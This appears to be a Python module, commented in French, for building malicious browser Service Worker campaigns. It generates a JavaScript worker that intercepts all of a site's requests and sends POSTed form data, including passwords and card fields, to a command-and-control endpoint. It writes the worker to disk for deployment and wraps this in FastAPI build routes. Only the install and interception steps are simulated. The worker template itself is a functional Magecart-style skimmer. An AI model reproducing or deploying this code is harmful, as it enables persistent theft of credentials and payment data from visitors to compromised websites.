"""
Service Worker Persistence Attack
==================================

Exploite l'API Service Worker (SW) du navigateur pour :
  1. Installer un SW malveillant sur le domaine de l'attaquant (legit SW scope)
  2. Intercepter TOUTES les requêtes sortantes du domaine après la première
     visite (persistante tant que le SW n'est pas désinstallé par l'utilisateur)
  3. Modifier à la volée les réponses HTTP pour injecter un payload BitB /
     web skimmer / crypto-jacker
  4. Exfiltrer via fetch() avec en-tête custom mimant du trafic analytics

Particulièrement dévastateur car :
  - Le SW survit à la fermeture de l'onglet
  - Le SW n'apparaît pas dans la favicon / l'UI de l'onglet
  - Le SW ne demande pas de permission spéciale (contrairement à Notif API)
  - Difficile à détecter par un utilisateur moyen

Variante moderne (2024-2026) : utilisé par des groupes APT pour distribuer
des web skimmers de type Magecart sur des sites de e-commerce compromis.
"""

import base64
import hashlib
import json
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional


@dataclass
class SWCampaign:
    """Une campagne d'installation de Service Worker malveillant."""

    campaign_id: str
    attacker_domain: str           # ex: cdn.analytics-vendor.com
    target_origin: str             # ex: https://shop.example.com
    sw_script: str                 # code JavaScript du Service Worker
    scope: str                     # ex: / pour intercepter tout le domaine
    install_ts: float = field(default_factory=time.time)
    installed: bool = False
    intercept_count: int = 0
    exfil_count: int = 0


class ServiceWorkerExploit:
    """
    Construit et déploie des Service Workers offensifs.

    Le flux typique :
      1. L'attaquant compromet un site (XSS / upload de fichier / supply chain)
      2. Il injecte un <script> qui appelle navigator.serviceWorker.register()
      3. Le SW s'installe et active, et persiste indéfiniment
      4. Chaque visite du site est interceptée par le SW
      5. Le SW peut modifier les réponses (skimmer), exfiltrer les formulaires,
         ou même pivoter vers d'autres origines via postMessage().
    """

    SW_TEMPLATE = """
// Service Worker offensif - {campaign_id}
// {attacker_domain} -> {target_origin}

const C2 = "{c2_endpoint}";
const SKIM_SELECTOR = "{skimmer_selector}";

self.addEventListener('install', (event) => {{
  self.skipWaiting();
}});

self.addEventListener('activate', (event) => {{
  event.waitUntil(self.clients.claim());
}});

self.addEventListener('fetch', (event) => {{
  const url = new URL(event.request.url);
  // Ne pas boucler sur nos propres requêtes d'exfil
  if (url.href.startsWith(C2)) return;

  event.respondWith(
    fetch(event.request)
      .then((response) => {{
        // Cloner pour pouvoir lire + renvoyer
        const clone = response.clone();
        // Exfil des form data interceptées (méthode simple : on tente de lire
        // le body si c'est du POST application/x-www-form-urlencoded)
        if (event.request.method === 'POST') {{
          event.request.clone().text().then((body) => {{
            if (body && body.length > 0) {{
              fetch(C2, {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{
                  type: 'sw_form_intercept',
                  url: event.request.url,
                  body: body,
                  ts: Date.now()
                }}),
                keepalive: true
              }});
            }}
          }});
        }}
        return response;
      }})
      .catch((err) => {{
        // Fallback : on retourne une réponse depuis le cache si offline
        return caches.match(event.request);
      }})
  );
}});
"""

    def __init__(self, output_dir: str = "captures/sw_persistence") -> None:
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.campaigns: dict[str, SWCampaign] = {}

    def build_campaign(
        self,
        attacker_domain: str,
        target_origin: str,
        c2_endpoint: str = "https://c2.example.invalid/sw-ingest",
        skimmer_selector: str = 'input[type="password"], input[name*="card"]',
    ) -> SWCampaign:
        """Construit un SW malveillant prêt à être déployé."""
        campaign_id = str(uuid.uuid4())
        sw_code = self.SW_TEMPLATE.format(
            campaign_id=campaign_id,
            attacker_domain=attacker_domain,
            target_origin=target_origin,
            c2_endpoint=c2_endpoint,
            skimmer_selector=skimmer_selector,
        )
        campaign = SWCampaign(
            campaign_id=campaign_id,
            attacker_domain=attacker_domain,
            target_origin=target_origin,
            sw_script=sw_code,
            scope="/",
        )
        self.campaigns[campaign_id] = campaign
        # Persist le SW sur disque pour déploiement
        path = self.output_dir / f"sw_{campaign_id}.js"
        path.write_text(sw_code, encoding="utf-8")
        return campaign

    def simulate_install(self, campaign_id: str) -> bool:
        """Simule l'installation du SW (en labo)."""
        c = self.campaigns.get(campaign_id)
        if not c:
            return False
        c.installed = True
        return True

    def simulate_intercept(
        self, campaign_id: str, n_intercepts: int = 1
    ) -> dict[str, Any]:
        """Simule N interceptions de requêtes par le SW."""
        c = self.campaigns.get(campaign_id)
        if not c or not c.installed:
            return {"error": "campaign not installed"}
        c.intercept_count += n_intercepts
        return {
            "campaign_id": campaign_id,
            "intercept_count": c.intercept_count,
        }


# ---------------------------------------------------------------------------
# API FastAPI
# ---------------------------------------------------------------------------

def register_sw_routes(app) -> None:
    from fastapi import HTTPException
    from pydantic import BaseModel

    exploit = ServiceWorkerExploit()

    class BuildRequest(BaseModel):
        attacker_domain: str
        target_origin: str
        c2_endpoint: str = "https://c2.example.invalid/sw-ingest"

    @app.post("/_/sw/build")
    async def build(req: BuildRequest):
        c = exploit.build_campaign(
            attacker_domain=req.attacker_domain,
            target_origin=req.target_origin,
            c2_endpoint=req.c2_endpoint,
        )
        return {
            "campaign_id": c.campaign_id,
            "sw_path": str(exploit.output_dir / f"sw_{c.campaign_id}.js"),
            "preview": c.sw_script[:500] + "...",
        }

    @app.post("/_/sw/install/{campaign_id}")
    async def install(campaign_id: str):
        ok = exploit.simulate_install(campaign_id)
        if not ok:
            raise HTTPException(404, "campaign not found")
        return {"installed": True}

    @app.post("/_/sw/intercept/{campaign_id}")
    async def intercept(campaign_id: str, count: int = 1):
        return exploit.simulate_intercept(campaign_id, count)
